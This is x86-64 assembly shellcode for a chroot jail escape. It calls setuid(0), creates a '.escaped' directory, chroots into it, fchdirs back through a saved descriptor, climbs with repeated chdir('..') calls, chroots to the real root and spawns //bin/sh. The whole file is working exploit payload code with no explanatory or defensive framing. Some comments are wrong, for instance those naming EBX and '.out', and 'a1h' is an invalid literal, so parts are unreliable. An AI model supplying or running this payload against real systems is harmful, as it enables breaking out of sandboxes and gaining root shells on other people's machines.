global _start
_start:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	mov al, 69h			;// Syscall for SETUID
					;// RDI is 0 for setuid(0)
	syscall				;// Call the kernel

	xor rax, rax			;// RAX should be 0 for successful setuid, but it may be -1 on error. This is faster than test/jnz
	push rax
	mov al, 53h			;// Syscall for MKDIR
	mov rdi, 0x646570616373652e	;// ".escaped" in reverse
	push rdi
	mov rdi, rsp			;// pointer to ".escaped" folder string
	xor rcx, rcx
	mov cx, 755o
	mov rsi, rcx			;// rwxr-xr-x
	syscall

	xor rax, rax
	xor rsi, rsi			;// O_RDONLY (000000000)
	xor rdx, rdx
	mov al, 0x2e			;// Open "." string
	push rax			;// Push "\x00\x00\x00\x00\x00\x00\x00." onto stack
	mov rdi, rsp			;// Set RDI to the string pointer
	mov al, 2h			;// Syscall for open
	syscall

	mov r15, rax			;// Move File Descriptor into R15 for later
	push rdx			;// push 0x000000 for null terminator
	mov rdi, 0x646570616373652e	;// ".escaped" in reverse
	push rdi
	mov rdi, rsp			;// pointer to ".escaped" folder string
	xor rax, rax
	mov al, a1h			;// Syscall for CHROOT
	syscall

	xor rax, rax
	mov rdi, r15			;// move ".escaped" File Descriptor we saved earlier into RBX
	mov al, 51h			;// Syscall for FCHDIR
	syscall
	
	xor rax, rax
	mov al, 3h			;// Syscall for CLOSE
	mov rdi, r15			;// Move the File Descriptor for ".out" into 
	syscall

	xor rax, rax
	mov ax, 0x2e2e			;// move ".." to stack
	push rax
	mov rdi, rsp			;// EBX now contains a pointer to "..\x00\x00\x00\x00\x00\x00" in human-readable format
	xor r15, r15
	mov r15w, 1000			;// loop 1000 times
	nop
loop1:	xor rax, rax			;// return value should always be 0, but just in case...
	mov al, 50h			;// Syscall for CHDIR
	syscall
	dec r15
	test r15, r15
	jnz loop1

	xor rcx, rcx
	mov cl, 0x2e			;// Set ECX to "."
	push rcx			;// Push "." onto stack
	mov rdi, rsp			;// Pointer to ".out" folder string
	mov al, a1h			;// Syscall for CHROOT
	syscall

	nop

	xor rax, rax
	push rax
	mov r15, 0x68732f6e69622f2f	;// "hs/nib//" for "//bin/sh" to execute. Don't asume bash or dash just in case.
	push r15
	mov rdi, rsp			;// Set the char* parameter to the file name //bin/sh
	push rax			;// push 0x00000000
	mov rdx, rsp			;// NULL for the Environment...
	push rdi			;// Push the address of "//bin/sh" for the list of arguments. Executing '//bin/sh //bin/sh'
	mov rsi, rsp
	mov al, 3bh			;// Syscall for EXECVE
	syscall

	xor rax, rax
	xor rdi, rdi
	mov dl, 123d
	mov al, 3ch
	syscall
